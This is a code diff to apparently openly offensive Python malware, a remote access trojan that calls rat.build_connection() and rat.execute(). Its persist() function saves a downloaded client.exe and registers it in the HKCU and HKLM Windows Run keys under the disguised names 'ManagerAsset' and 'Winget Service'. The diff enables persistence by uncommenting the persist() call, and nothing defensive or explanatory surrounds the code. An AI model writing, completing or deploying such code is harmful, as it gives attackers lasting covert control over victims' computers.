@@ -682,8 +682,7 @@ def persist():
             open('client.exe', 'wb').write(response.content)
             command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Service\\client.exe"'
             os.system(command)
-            os.system(
-                f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Service\\client.exe"')
+            os.system(f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Service\\client.exe"')
 
         except FileExistsError:
             os.chdir('Winget Service')
@@ -696,6 +695,6 @@ def persist():
 
 
 if __name__ == '__main__':
-    # persist()
+    persist()
     rat.build_connection()
     rat.execute()
